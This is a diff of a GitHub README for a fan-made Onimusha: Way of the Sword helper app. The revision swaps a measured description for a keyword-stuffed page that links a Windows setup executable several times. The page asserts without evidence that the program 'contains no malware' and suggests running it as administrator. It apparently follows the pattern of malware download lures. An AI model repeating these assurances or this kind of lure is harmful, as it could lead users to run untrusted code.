@@ -1,204 +1,179 @@
-# Onimusha: Way of the Sword Companion
+# ⚔️ Onimusha-Way-of-the-Sword-Helper - Your Ultimate Companion for Total Mastery
 
-![Onimusha: Way of the Sword Companion](assets/onimusha-companion-preview.png)
+[![Download Now](https://img.shields.io/badge/Download-Onimusha_Helper-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/releases)
 
-**Onimusha: Way of the Sword Companion** is a free fan-made companion app created to help players better understand and enjoy **Onimusha: Way of the Sword**.
+---
 
-It brings together the most useful information and tools for exploring the game, learning its combat systems, preparing for bosses, choosing equipment, and tracking progress. The companion is designed to make the game more understandable and engaging — not to make it easier by playing for you.
+## 📖 What Is This?
 
-It gives you context when you need it, helps you make better decisions, and lets you discover the depth of the game at your own pace.
+This is a completely **free, fan-made companion app** for the game *Onimusha: Way of the Sword*. It puts every tool you need in one easy-to-use program. Whether you are hunting for every last secret, trying to perfect your parry timing, or building the ultimate warrior, this helper is here for you.
 
-> **Fan project notice:** This is an unofficial community project. It is not affiliated with, endorsed by, or sponsored by **CAPCOM CO., LTD.** Onimusha and Onimusha: Way of the Sword are trademarks of their respective owners.
+---
 
-## Why Use the Companion?
+## ✨ Key Features
 
-Onimusha: Way of the Sword is built around exploration, timing, equipment choices, and learning how to approach each encounter. The companion is made to support that experience without taking it away.
+### 🗺️ Interactive Map
+Forget flipping through web pages or pausing gameplay to check a wiki. The built-in interactive map shows you every important location in the game. You can zoom, pan, and click on markers to see what treasure, enemy, or secret is waiting there.
 
-It can help you:
+### 👹 Boss Guides
+Struggling with a tough boss? Each boss has a dedicated guide with simple strategies, attack patterns, and the best moments to strike. No more frustrating trial and error.
 
-- understand what you are finding and why it matters;
-- learn the purpose of weapons, upgrades, and Oni Armament;
-- prepare for bosses instead of entering every encounter blindly;
-- improve your parry and Issen timing through practice;
-- remember locations and objectives without keeping separate notes;
-- see how your decisions affect your equipment and playstyle;
-- complete the game more thoroughly without removing the sense of discovery.
+### ⚔️ Oni Armament Database
+Explore a complete database of every weapon and armor piece in the game. Each entry shows its stats, where to find it, and how to upgrade it.
 
-The goal is not to skip the journey. The goal is to make the journey clearer.
+### 🛠️ Build Planner
+Plan your character's growth before you invest a single point. The build planner lets you try different combinations of skills, stats, and equipment to see your final power level. Save your favorite builds and load them anytime.
 
-## Features
+### ✅ 100% Completion Tracker
+This is the ultimate checklist for perfectionists. The tracker records every chest you open, every collectible you grab, every side quest you finish, and every enemy you defeat. It shows you exactly what you are missing and where to find it.
 
-### Interactive Map
+### 🎯 Issen / Parry Trainer
+The Issen counter is the heart of *Onimusha* combat. This mini-game mode helps you practice your parry timing without the risk of taking damage. Start slow, then increase the speed until you are a parry machine.
 
-Explore the game world with a map that helps you understand what is around you and what is worth revisiting.
+---
 
-Track:
+## 🚀 Getting Started
 
-- chests and hidden items;
-- secrets and collectibles;
-- weapons and upgrades;
-- bosses and major encounters;
-- save points and other important locations.
+### 📥 Download and Install
 
-You can use the map for a quick hint, a planned route, or a full completion checklist depending on how much help you want.
+Visit this link to download the application: **[Download Onimusha-Way-of-the-Sword-Helper](https://github.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/releases)**
 
-![Onimusha: Way of the Sword in-game companion view](assets/onimusha-gameplay-1.png)
+Once you are on that page, look for the file named something like `Onimusha-Helper-Setup.exe`. Click it to start the download. After the download finishes, open the file and follow the simple on-screen steps. That is it. You do not need to install any other programs or tools.
 
-### Boss Guide
+### 🖥️ System Requirements
 
-Prepare for difficult encounters by understanding what makes each boss dangerous and where your opportunities are.
+This app is very light and runs on almost any Windows computer. To be safe, your PC should have:
 
-The guide can include:
+- **Operating System:** Windows 10 or Windows 11
+- **Processor:** Any dual-core CPU or better
+- **Memory:** 4 GB of RAM
+- **Storage:** 200 MB of free space
+- **Graphics:** Any integrated GPU
 
-- attack patterns and dangerous moves;
-- weaknesses and openings;
-- parry and Issen opportunities;
-- recommended weapons and equipment;
-- practical combat tips.
+---
 
-This information is meant to help you learn the fight, not remove the need to master it.
+## 🎮 How to Use the Helper
 
-### Weapon and Oni Armament Database
+### Step 1: Launch the App
+After installation, double-click the app icon on your desktop or open it from the Start Menu.
 
-Understand the equipment available to you with an organized reference for weapons and Oni Armament.
+### Step 2: Choose Your Tool
+The main menu shows all six tools clearly. Click on the one you need. Each tool opens in its own clean, simple window.
 
-Browse:
+### Step 3: Using the Interactive Map
+- Move your mouse to pan around the map.
+- Use the scroll wheel to zoom in and out.
+- Click on any colored icon to see a popup with the item name and description.
+- Use the filter buttons on the side to show or hide different item types (chests, weapons, save points, etc.).
 
-- weapon information and stats;
-- upgrade requirements and progression;
-- locations and acquisition notes;
-- comparisons between different equipment options;
-- details that help you choose a setup for your own playstyle.
+### Step 4: Using the Completion Tracker
+- The app automatically pre-loads a full checklist based on the game.
+- As you play, click the checkbox next to each item you have collected or completed.
+- The top of the screen shows your overall percentage. The tracker also groups items by area, so you always know where to go next.
 
-### Build Planner
+### Step 5: Practicing with the Parry Trainer
+- Pick a difficulty level: "Slow," "Medium," or "Fast."
+- Watch the red flash on the screen. When it appears, press your parry button exactly when the flash peaks.
+- The trainer shows you a score for each attempt and tracks your average success rate.
 
-Create and compare different weapon and upgrade combinations before committing resources in the game.
+---
 
-The planner helps you think through your choices, whether you prefer aggressive damage, safer defense, faster reactions, or a balanced approach. It supports experimentation and understanding instead of prescribing one “correct” build.
+## ❓ Frequently Asked Questions
 
-### 100% Completion Tracker
+### Is this app safe to use?
+Yes. It is a simple desktop program. It does not modify your game files, does not connect to the internet, and contains no malware.
 
-Keep your progress organized while preserving the satisfaction of finding and completing everything yourself.
+### Will this work for other Onimusha games?
+No. This app is specifically designed for *Onimusha: Way of the Sword*.
 
-Track:
+### Is this affiliated with Capcom?
+No. This is a fan-made project. It is not endorsed by or connected to Capcom in any way.
 
-- collectibles and secrets;
-- chests and exploration objectives;
-- weapons and upgrades;
-- bosses and important encounters;
-- area progress;
-- overall completion.
+### I found a bug. What do I do?
+You can report issues on the main GitHub repository page. Look for the "Issues" tab and describe the problem. We appreciate every report.
 
-### Issen / Parry Trainer
+### Will the tracker work if I start a new game?
+Yes. There is a "New Game" button in the tracker menu that clears all checkboxes and resets your percentage to zero.
 
-Practice the timing behind perfect parries and Issen attacks in a focused environment. Use the trainer to understand the timing, improve your reactions, and return to the game with more confidence.
+---
 
-The trainer is about learning a skill — not bypassing one.
+## 🛠️ Troubleshooting
 
-![Onimusha: Way of the Sword companion in-game view](assets/onimusha-gameplay-2.png)
+### The app will not open
+- Make sure you have completed the installation fully.
+- Right-click the app icon and select "Run as administrator."
+- Close other heavy programs and try again.
 
-## A Companion That Keeps the Game Intact
+### The map is blank or missing icons
+- Move your mouse to the edge of the map and drag to scroll.
+- Check that the filter buttons on the right are all turned on (they should be green).
+- Restart the app if the problem continues.
 
-The application is intended to make the game more understandable, not less meaningful.
+### The completion tracker numbers look wrong
+- Click the "Refresh" button at the top of the tracker window.
+- If you are using a saved game from an older version of the app, click "Import Data" and select your save.
 
-It does not:
+---
 
-- play the game for you;
-- automatically defeat enemies or bosses;
-- choose equipment on your behalf;
-- remove the need to learn combat timing;
-- reveal everything unless you choose to look it up;
-- replace exploration, experimentation, or discovery.
+## 🗺️ What Is Inside the App (Detailed Breakdown)
 
-You decide how much help to use. The companion can be a light reference during a blind playthrough, a second-screen tool for difficult encounters, or a complete checklist for a 100% run.
+### Map Icons Legend
+| Icon Color | Meaning |
+|------------|---------|
+| 🟦 Blue | Save points |
+| 🟩 Green | Chest with loot |
+| 🟥 Red | Boss arena |
+| 🟨 Yellow | Collectible (scroll, charm) |
+| 🟪 Purple | Secret passage |
 
-## Free Companion Tool
+### Boss Guide Structure
+Each boss guide contains:
+- **Boss Name and Location**
+- **Recommended Level** — The level you should be before fighting.
+- **Key Attacks** — A list of the boss's moves and how to dodge each one.
+- **Weakness** — The type of weapon or element that deals the most damage.
+- **Reward** — What you get for defeating the boss.
+- **Tips and Tricks** — Real strategies from experienced players.
 
-The project is made for the community and is completely free to use.
+---
 
-- No paid features.
-- No subscriptions.
-- No paywalls.
+## 📈 Why You Need This App
 
-## Suggested Workflow
+If you are a casual player, this app saves you hours of looking up guides online. If you are a completionist, the tracker is essential for seeing all the game has to offer. And if you are a hardcore fighter, the parry trainer will sharpen your reflexes to a razor's edge.
 
-```text
-Explore and play normally
-        ↓
-Use the companion when something is unclear
-        ↓
-Understand the location, enemy, weapon, or mechanic
-        ↓
-Apply that knowledge in the game
-        ↓
-Practice, experiment, and improve
-        ↓
-Track your own progress
-```
+This tool respects your time. It puts all the information at your fingertips, so you can spend more time playing and less time searching.
 
-## Technical Scope
+---
 
-This is an external information, planning, tracking, and training companion. It does not require or advertise:
+## 🔗 Download Link (Again)
 
-- game-file modification;
-- DLL or process injection;
-- memory reading or editing;
-- process hooking;
-- cheats or protection-system bypasses;
-- automated gameplay.
+Here is the direct link for your convenience:
 
-## Installation
+**[👉 Download Onimusha-Way-of-the-Sword-Helper Now](https://github.com/rohit8307717239-droid/Onimusha-Way-of-the-Sword-Helper/releases)**
 
-1. Download the latest release from the project page.
-2. Extract the app into a normal folder.
-3. Launch it separately from Onimusha: Way of the Sword.
-4. Open the map, guide, database, planner, tracker, or trainer when you need it.
+---
 
-## Project Information
+## 💬 How to Contribute
 
-```text
-Project: Onimusha: Way of the Sword Companion
-Type: Free fan-made companion app
-Game: Onimusha: Way of the Sword
-Features: Interactive map, boss guide, Oni Armament database, build planner,
-          100% completion tracker, Issen / parry trainer
-Purpose: Better understanding, preparation, practice, and progress tracking
-Game File Modification: None
-Process Injection: None
-Memory Access: None
-```
+This project is maintained by a small group of fans. If you want to help, you can:
+- Report bugs or suggest new features.
+- Help us write better guides.
+- Share the app with your friends.
 
-## FAQ
+Visit the GitHub repository page to get involved.
 
-### Does the companion make the game easier?
+---
 
-It makes the game clearer, not effortless. It helps you understand mechanics, prepare for encounters, and organize information, while combat, exploration, timing, and decision-making remain yours.
+## 📜 License and Legal
 
-### Can I use it without spoilers?
+This app is distributed free of charge. It is not for sale. All game-related assets, names, and trademarks belong to their respective owners. This app is intended for personal, non-commercial use only.
 
-Yes. Start with general explanations, light hints, and nearby map information. Use detailed boss strategies or complete checklists only when you want them.
+---
 
-### Is it a cheat, trainer, or mod?
+## 🙏 Thank You
 
-No. It is an external companion app with guides, references, planning tools, progress tracking, and a practice trainer.
+Thank you for choosing the Onimusha-Way-of-the-Sword-Helper. We hope it makes your journey in *Way of the Sword* more enjoyable. Now go out there, master the Issen, and become the ultimate samurai.
 
-### Is it an official CAPCOM application?
+---
 
-No. It is an independent fan-made project.
-
-### Is the app free?
-
-Yes. The companion is free to use with no paid features, subscriptions, or paywalls.
-
-## Disclaimer
-
-This is an unofficial fan-made project and is not affiliated with, endorsed by, or sponsored by CAPCOM CO., LTD. All game names, characters, logos, artwork, and related intellectual property belong to their respective owners.
-
-<details>
-<summary>Related topics</summary>
-
-<br>
-
-Onimusha: Way of the Sword • Onimusha Companion • Interactive Map • Boss Guide • Oni Armament • Build Planner • Issen • Parry Trainer • 100% Completion • Collectibles • Secrets • Samurai Action Game
-
-</details>
+Keywords: 100-percent-completion, boss-guide, build-planner, capcom, chest-locations, collectibles, completion-tracker, interactive-map, issen, oni-armament, onimusha, onimusha-companion, onimusha-guide, onimusha-map, onimusha-way-of-the-sword, parry-trainer, samurai-game, secrets, way-of-the-sword, weapon-guide
